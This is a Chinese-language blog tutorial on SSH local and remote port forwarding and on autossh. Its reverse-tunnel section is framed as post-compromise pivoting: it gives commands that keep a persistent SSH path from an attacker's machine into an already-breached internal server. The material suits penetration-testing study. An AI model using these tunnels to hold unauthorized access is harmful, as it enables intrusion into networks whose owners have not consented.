**目录**

[SSH做本地端口转发](#t0 "SSH做本地端口转发")

[SSH做反向隧道(远程端口转发)](#t1 "SSH做反向隧道(远程端口转发)")

[用autossh建立稳定隧道](#t2 "用autossh建立稳定隧道")

* * *

[SSH](https://so.csdn.net/so/search?q=SSH&spm=1001.2101.3001.7020)开启端口转发需要修改 /etc/ssh/sshd\_config配置文件，将 GatewayPorts修改为yes

![](https://img-blog.csdnimg.cn/20190823113011798.png)

```
-f 后台执行ssh指令      
-C 允许压缩数据      
-N 不执行远程指令      
-R 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口      
-L 本地端口转发      
-D 动态端口转发
```


### SSH做本地端口转发

现在我们有这样一种情景，服务器A上有Redis数据库，并且我们知道Redis数据库的密码。但是Redis数据库只监听本地的6379端口，也就是127.0.0.1:6379，现在我们需要连接该Redis数据库，读取其中的数据。那么，我们就可以用SSH做本地[端口转发](https://so.csdn.net/so/search?q=%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91&spm=1001.2101.3001.7020)，在服务器A上监听16379端口，当连接该主机的16379端口时，16379端口相当于正向代理，将我们的流量给本地的6379端口，再将6379端口返回的流量给我们的主机

![](https://img-blog.csdnimg.cn/20190812213616645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
ssh -fCNL *:16379:localhost:6379 localhost  #本地监听16379端口，将16379端口的流量都转发给6379端口
```


### SSH做反向隧道(远程端口转发)

> 注意：这里公网服务器B和内网服务器A都必须是Linux系统，才能建立SSH隧道

现在我们有这么一个环境，我们拿到了公网服务器B的权限，并通过公网服务器B进一步内网渗透，拿到了内网服务器A的权限。但是现在我们想要在自己的Kali机器上，获取内网服务器A的一个稳定持久的SSH权限。那么，我们可以通过SSH反向隧道，来得到内网服务器A的一个SSH权限。我们可以将内网服务器A的22端口远程转发到公网服务器的1234端口。

通俗地说，就是在机器A上做到B机器的反向代理；然后在B机器上做正向代理实现远程端口的转发

![](https://img-blog.csdnimg.cn/20190601214317518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

首先，在内网服务器A的操作

```
反向代理      
ssh -fCNR  192.168.10.139:8888:localhost:22  root@192.168.10.139  #意思就是将A机器的22号端口的流量都转发给B机器的8888端口
```


![](https://img-blog.csdnimg.cn/20190601214547958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后，公网服务器B的操作

```
正向代理      
ssh -fCNL  *:1234:localhost:8888 localhost  #意思就是将本地监听的1234端口的流量都转发给本地的8888端口
```


![](https://img-blog.csdnimg.cn/20190601214511824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

接着，在黑客机器C的操作，通过ssh公网服务器B的某个端口实现ssh内网服务器A的22号端口

```
ssh -p 1234 root@100.100.10.12   #ssh连接到公网服务器的1234端口
```


![](https://img-blog.csdnimg.cn/2019060121470359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**所以最终流量的走向是这样的**：黑客SSH到公网服务器B的1234端口，公网服务器B监听了本地的1234端口，将流量转发到本地的8888端口，于是内网服务器A将本地的22号端口反向代理到了公网服务器B的8888端口，公网服务器B又将8888端口的流量转发到了本地的1234端口，所以黑客SSH连接到了内网服务器A。

![](https://img-blog.csdnimg.cn/20190601223005612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**缺点**：这种ssh反向链接会因为超时而关闭，如果关闭了那从外网连通内网的通道就无法维持了，为此我们需要另外的方法来提供稳定的ssh反向代理隧道。

### **用autossh建立稳定隧道**

安装autossh：yum install autossh

autossh的参数与ssh的参数是一致的，但是不同的是，在隧道断开的时候，autossh会自动重新连接而ssh不会。另外不同的是我们需要指出的-M参数，这个参数指定一个端口，这个端口是外网的B机器用来接收内网A机器的信息，如果隧道不正常而返回给A机器让他实现重新连接。  
在内网A机器上的操作：

```
反向代理      
autossh -M 9999 ssh -fCNR  192.168.10.139:8888:localhost:22  root@192.168.10.139
```


 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[实战SSH端口转发](https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html#icomments "实战SSH端口转发")

                 [使用SSH反向隧道进行内网穿透](https://blog.csdn.net/jiangbenchu/article/details/84438959 "使用SSH反向隧道进行内网穿透")

相关文章：[内网转发](https://blog.csdn.net/qq_36119192/article/details/84568266#%C2%A0NC%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BC%B9shell "内网转发")

文章知识点与官方知识档案匹配，可进一步学习相关知识

[CS入门技能树](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[Linux入门](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[初识Linux](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)10949 人正在系统学习中